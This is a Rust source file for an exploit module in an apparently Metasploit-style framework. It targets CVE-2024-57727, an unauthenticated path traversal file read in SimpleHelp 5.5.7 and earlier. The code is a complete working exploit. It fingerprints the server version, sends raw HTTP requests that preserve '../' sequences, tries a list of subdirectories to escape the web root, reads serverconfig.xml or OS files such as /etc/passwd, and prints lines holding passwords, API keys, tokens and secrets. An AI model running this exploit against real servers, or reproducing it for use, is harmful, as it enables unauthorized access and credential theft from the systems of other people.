use amatsumara_api::*;
use std::ffi::{c_char, c_int, c_void, CStr};
use std::io::{Read as IoRead, Write as IoWrite};
use std::net::TcpStream;
use std::time::Duration;

// --- Static metadata ---

static NAME: &str = "SimpleHelp Path Traversal File Read (CVE-2024-57727)";
static DESCRIPTION: &str =
    "Unauthenticated arbitrary file read via path traversal in SimpleHelp <= 5.5.7. \
     The /toolbox-resource/ endpoint does not sanitize requested paths, allowing ../ \
     sequences to escape the web root and read arbitrary files. CVSS 7.5.";
static AUTHOR: &str = "Amatsumara Project";

static PLATFORMS: &[Platform] = &[Platform::Linux, Platform::Windows];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86];

// --- Option definitions ---

static RHOSTS_NAME: &str = "RHOSTS";
static RHOSTS_DESC: &str = "Target host";
static RHOSTS_DEFAULT: &str = "";

static RPORT_NAME: &str = "RPORT";
static RPORT_DESC: &str = "Target port";
static RPORT_DEFAULT: &str = "80";

static SSL_NAME: &str = "SSL";
static SSL_DESC: &str = "Use HTTPS instead of HTTP";
static SSL_DEFAULT: &str = "false";

static TARGETURI_NAME: &str = "TARGETURI";
static TARGETURI_DESC: &str = "Base URI path for SimpleHelp";
static TARGETURI_DEFAULT: &str = "/";

static FILEPATH_NAME: &str = "FILEPATH";
static FILEPATH_DESC: &str = "File to read relative to SimpleHelp root (or absolute for OS files)";
static FILEPATH_DEFAULT: &str = "configuration/serverconfig.xml";

static DEPTH_NAME: &str = "DEPTH";
static DEPTH_DESC: &str = "Traversal depth (2 = SimpleHelp root, 6-8 = /etc/passwd)";
static DEPTH_DEFAULT: &str = "2";

static OUTFILE_NAME: &str = "OUTFILE";
static OUTFILE_DESC: &str = "Save retrieved file contents to this path (optional)";
static OUTFILE_DEFAULT: &str = "";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: RHOSTS_NAME.as_ptr() as *const c_char, len: RHOSTS_NAME.len() },
        description: CString { ptr: RHOSTS_DESC.as_ptr() as *const c_char, len: RHOSTS_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: RHOSTS_DEFAULT.as_ptr() as *const c_char, len: RHOSTS_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: RPORT_NAME.as_ptr() as *const c_char, len: RPORT_NAME.len() },
        description: CString { ptr: RPORT_DESC.as_ptr() as *const c_char, len: RPORT_DESC.len() },
        required: false,
        option_type: OptionType::Port,
        default_value: CString { ptr: RPORT_DEFAULT.as_ptr() as *const c_char, len: RPORT_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: SSL_NAME.as_ptr() as *const c_char, len: SSL_NAME.len() },
        description: CString { ptr: SSL_DESC.as_ptr() as *const c_char, len: SSL_DESC.len() },
        required: false,
        option_type: OptionType::Bool,
        default_value: CString { ptr: SSL_DEFAULT.as_ptr() as *const c_char, len: SSL_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: TARGETURI_NAME.as_ptr() as *const c_char, len: TARGETURI_NAME.len() },
        description: CString { ptr: TARGETURI_DESC.as_ptr() as *const c_char, len: TARGETURI_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: TARGETURI_DEFAULT.as_ptr() as *const c_char, len: TARGETURI_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: FILEPATH_NAME.as_ptr() as *const c_char, len: FILEPATH_NAME.len() },
        description: CString { ptr: FILEPATH_DESC.as_ptr() as *const c_char, len: FILEPATH_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: FILEPATH_DEFAULT.as_ptr() as *const c_char, len: FILEPATH_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: DEPTH_NAME.as_ptr() as *const c_char, len: DEPTH_NAME.len() },
        description: CString { ptr: DEPTH_DESC.as_ptr() as *const c_char, len: DEPTH_DESC.len() },
        required: false,
        option_type: OptionType::Int,
        default_value: CString { ptr: DEPTH_DEFAULT.as_ptr() as *const c_char, len: DEPTH_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: OUTFILE_NAME.as_ptr() as *const c_char, len: OUTFILE_NAME.len() },
        description: CString { ptr: OUTFILE_DESC.as_ptr() as *const c_char, len: OUTFILE_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: OUTFILE_DEFAULT.as_ptr() as *const c_char, len: OUTFILE_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Auxiliary,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

// --- Valid subdirectory names for path traversal (order matters) ---

const VALID_DIRS: &[&str] = &[
    "secmsg", "html", "toolbox", "alertsdb", "backups", "sslconfig",
    "translations", "notifications", "techprefs", "history", "recordings",
    "templates", "remotework", "toolbox-resources", "invitations", "resource1",
];

// --- Module implementation ---

struct SimpleHelpModule {
    rhost: String,
    rport: u16,
    ssl: bool,
    target_uri: String,
    filepath: String,
    depth: usize,
    outfile: String,
}

impl SimpleHelpModule {
    fn new() -> Box<Self> {
        Box::new(Self {
            rhost: String::new(),
            rport: 80,
            ssl: false,
            target_uri: "/".to_string(),
            filepath: "configuration/serverconfig.xml".to_string(),
            depth: 2,
            outfile: String::new(),
        })
    }

    /// Send a raw HTTP GET request preserving the exact path (no URL normalization).
    /// This is critical — reqwest/url::Url would collapse ../ sequences.
    fn send_raw_get(&self, path: &str) -> Result<(u16, String), String> {
        let request = format!(
            "GET {} HTTP/1.1\r\n\
             Host: {}:{}\r\n\
             Accept: */*\r\n\
             Accept-Encoding: identity\r\n\
             Connection: close\r\n\
             \r\n",
            path, self.rhost, self.rport
        );

        let addr = format!("{}:{}", self.rhost, self.rport);
        let stream = TcpStream::connect(&addr)
            .map_err(|e| format!("Connection failed: {}", e))?;
        stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(10))).ok();

        let response_bytes = if self.ssl {
            let connector = native_tls::TlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .build()
                .map_err(|e| format!("TLS build failed: {}", e))?;
            let mut tls = connector
                .connect(&self.rhost, stream)
                .map_err(|e| format!("TLS handshake failed: {}", e))?;
            tls.write_all(request.as_bytes())
                .map_err(|e| format!("Write failed: {}", e))?;
            let mut buf = Vec::new();
            let _ = tls.read_to_end(&mut buf);
            buf
        } else {
            let mut stream = stream;
            stream.write_all(request.as_bytes())
                .map_err(|e| format!("Write failed: {}", e))?;
            let mut buf = Vec::new();
            let _ = stream.read_to_end(&mut buf);
            buf
        };

        let raw = String::from_utf8_lossy(&response_bytes);
        parse_http_response(&raw)
    }

    /// Build the traversal URL path for a given subdirectory name.
    /// Format: {base}/toolbox-resource/../{dir}/{../../ * depth}{filepath}
    fn build_traversal_path(&self, dir_name: &str) -> String {
        let base = self.target_uri.trim_end_matches('/');
        let traversal = "../".repeat(self.depth);
        format!(
            "{}/toolbox-resource/../{}/{}{}",
            base, dir_name, traversal, self.filepath
        )
    }

    /// Try to extract and evaluate a "Visual Version:" string from response body.
    fn check_version_in_body(body: &str) -> Option<CheckCode> {
        if let Some(pos) = body.find("Visual Version:") {
            let after = &body[pos + "Visual Version:".len()..];
            let trimmed = after.trim_start();
            let ver_end = trimmed
                .find(|c: char| !c.is_ascii_digit() && c != '.')
                .unwrap_or(trimmed.len());
            let version = &trimmed[..ver_end];
            if version.is_empty() {
                return None;
            }
            eprintln!("[*] SimpleHelp version detected: {}", version);

            let parts: Vec<u32> = version
                .split('.')
                .filter_map(|p| p.parse().ok())
                .collect();
            if parts.len() >= 3 {
                if (parts[0], parts[1], parts[2]) <= (5, 5, 7) {
                    eprintln!("[+] Target appears vulnerable (version {} <= 5.5.7)", version);
                    return Some(CheckCode::Appears);
                } else {
                    eprintln!("[*] Target version {} is patched (>= 5.5.8)", version);
                    return Some(CheckCode::Safe);
                }
            }
            return Some(CheckCode::Unknown);
        }
        None
    }

    /// Detect SimpleHelp version by trying multiple endpoints.
    fn detect_version(&self) -> CheckCode {
        let base = self.target_uri.trim_end_matches('/');

        // Endpoints to probe for version info (in priority order)
        let paths = [
            format!("{}/allversions", base),
            format!("{}/welcome", base),
            if base.is_empty() { "/".to_string() } else { format!("{}/", base) },
        ];

        let mut saw_simplehelp = false;

        for path in &paths {
            match self.send_raw_get(path) {
                Ok((_status, body)) => {
                    if let Some(code) = Self::check_version_in_body(&body) {
                        return code;
                    }
                    if body.to_lowercase().contains("simplehelp") {
                        saw_simplehelp = true;
                    }
                }
                Err(_) => continue,
            }
        }

        if saw_simplehelp {
            eprintln!("[*] SimpleHelp detected but version could not be determined");
            CheckCode::Unknown
        } else {
            eprintln!("[-] Target does not appear to be running SimpleHelp");
            CheckCode::Safe
        }
    }

    /// Extract and highlight credential-looking fields from serverconfig.xml.
    fn extract_credentials(body: &str) {
        for line in body.lines() {
            let t = line.trim();
            if t.contains("<password") || t.contains("<Password")
                || t.contains("<passwordHash") || t.contains("<PasswordHash")
                || t.contains("<apiKey") || t.contains("<ApiKey") || t.contains("<api_key")
                || t.contains("<secret") || t.contains("<Secret")
                || t.contains("<token") || t.contains("<Token")
                || t.contains("<credential") || t.contains("<Credential")
            {
                eprintln!("[+] Credential found: {}", t);
            }
        }
    }

    /// Main run logic: try each valid directory until file is retrieved.
    fn run_file_read(&self) -> i32 {
        let scheme = if self.ssl { "https" } else { "http" };
        eprintln!(
            "[*] Target: {}://{}:{}{}",
            scheme, self.rhost, self.rport, self.target_uri
        );
        eprintln!("[*] File: {}", self.filepath);
        eprintln!("[*] Traversal depth: {}", self.depth);
        eprintln!();

        for dir_name in VALID_DIRS {
            let path = self.build_traversal_path(dir_name);
            eprintln!("[*] Trying directory '{}' -> GET {}", dir_name, path);

            match self.send_raw_get(&path) {
                Ok((status, body)) => {
                    if status == 200 && !body.trim().is_empty() {
                        eprintln!(
                            "[+] Success! File retrieved via directory '{}' ({} bytes)",
                            dir_name,
                            body.len()
                        );
                        eprintln!();
                        eprintln!("--- File Contents ---");
                        eprintln!("{}", body);
                        eprintln!("--- End of File ---");
                        eprintln!();

                        if self.filepath.contains("serverconfig.xml") {
                            Self::extract_credentials(&body);
                        }

                        if !self.outfile.is_empty() {
                            match std::fs::write(&self.outfile, &body) {
                                Ok(_) => eprintln!("[+] Output saved to {}", self.outfile),
                                Err(e) => eprintln!("[-] Failed to save output: {}", e),
                            }
                        }

                        return 0;
                    }
                }
                Err(e) => {
                    eprintln!("[-] Error with '{}': {}", dir_name, e);
                }
            }
        }

        eprintln!();
        eprintln!(
            "[-] File read failed — no valid directory found. Tried: {}",
            VALID_DIRS.join(", ")
        );
        -1
    }
}

// --- Helpers ---

fn parse_http_response(raw: &str) -> Result<(u16, String), String> {
    let status_line = raw.lines().next().unwrap_or("");
    let status_code = status_line
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);

    let body = if let Some(pos) = raw.find("\r\n\r\n") {
        raw[pos + 4..].to_string()
    } else {
        String::new()
    };

    Ok((status_code, body))
}

fn parse_options(module: &mut SimpleHelpModule, options_json: *const c_char) {
    if options_json.is_null() {
        return;
    }
    let c_str = unsafe { CStr::from_ptr(options_json) };
    let json_str = match c_str.to_str() {
        Ok(s) => s,
        Err(_) => return,
    };
    let opts: serde_json::Value = match serde_json::from_str(json_str) {
        Ok(v) => v,
        Err(_) => return,
    };

    if let Some(v) = opts.get("RHOSTS").and_then(|v| v.as_str()) {
        module.rhost = v.to_string();
    }
    if let Some(v) = opts.get("RPORT").and_then(|v| v.as_str()) {
        if let Ok(p) = v.parse::<u16>() {
            module.rport = p;
        }
    }
    if let Some(v) = opts.get("SSL").and_then(|v| v.as_str()) {
        module.ssl = v.eq_ignore_ascii_case("true");
    }
    if let Some(v) = opts.get("TARGETURI").and_then(|v| v.as_str()) {
        if !v.is_empty() {
            module.target_uri = v.to_string();
        }
    }
    if let Some(v) = opts.get("FILEPATH").and_then(|v| v.as_str()) {
        if !v.is_empty() {
            module.filepath = v.to_string();
        }
    }
    if let Some(v) = opts.get("DEPTH").and_then(|v| v.as_str()) {
        if let Ok(d) = v.parse::<usize>() {
            module.depth = d;
        }
    }
    if let Some(v) = opts.get("OUTFILE").and_then(|v| v.as_str()) {
        module.outfile = v.to_string();
    }
}

// --- FFI entry points ---

extern "C" fn get_info() -> *const ModuleInfo {
    &MODULE_INFO
}

extern "C" fn init() -> *mut c_void {
    let module = SimpleHelpModule::new();
    Box::into_raw(module) as *mut c_void
}

extern "C" fn destroy(instance: *mut c_void) {
    if !instance.is_null() {
        unsafe {
            let _ = Box::from_raw(instance as *mut SimpleHelpModule);
        }
    }
}

extern "C" fn check(instance: *mut c_void, options_json: *const c_char) -> CheckCode {
    if instance.is_null() {
        return CheckCode::Unknown;
    }
    let module = unsafe { &mut *(instance as *mut SimpleHelpModule) };
    parse_options(module, options_json);

    if module.rhost.is_empty() {
        eprintln!("[-] RHOSTS not set");
        return CheckCode::Unknown;
    }

    module.detect_version()
}

extern "C" fn run(instance: *mut c_void, options_json: *const c_char) -> c_int {
    if instance.is_null() {
        eprintln!("[-] Module instance is null");
        return -1;
    }
    let module = unsafe { &mut *(instance as *mut SimpleHelpModule) };
    parse_options(module, options_json);

    if module.rhost.is_empty() {
        eprintln!("[-] RHOSTS not set");
        return -1;
    }

    module.run_file_read()
}

// --- VTable and registration ---

static VTABLE: ModuleVTable = ModuleVTable {
    get_info,
    init,
    destroy,
    check: Some(check),
    run,
};

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable {
    &VTABLE
}
